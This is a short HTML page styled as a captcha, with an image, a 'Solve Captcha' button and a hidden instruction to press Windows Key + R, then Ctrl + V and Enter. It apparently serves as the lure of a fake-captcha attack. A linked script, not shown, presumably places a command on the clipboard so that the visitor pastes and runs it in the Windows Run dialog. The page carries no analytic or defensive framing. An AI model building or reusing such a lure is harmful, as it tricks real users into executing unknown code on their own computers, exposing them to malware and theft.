<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captcha Bot</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="captcha-container">
        <img src="captcha.png" alt="Captcha Image" class="captcha-image">
        <div class="instruction">Please solve the captcha below:</div>
        <button class="button" id="solve-captcha">Solve Captcha</button>
        <div class="instruction" id="additional-instruction" style="display: none;">
            Press Windows Key + R, then press Ctrl + V and Enter.
        </div>
    </div>
    <script src="javascript.js"></script>
</body>
</html>
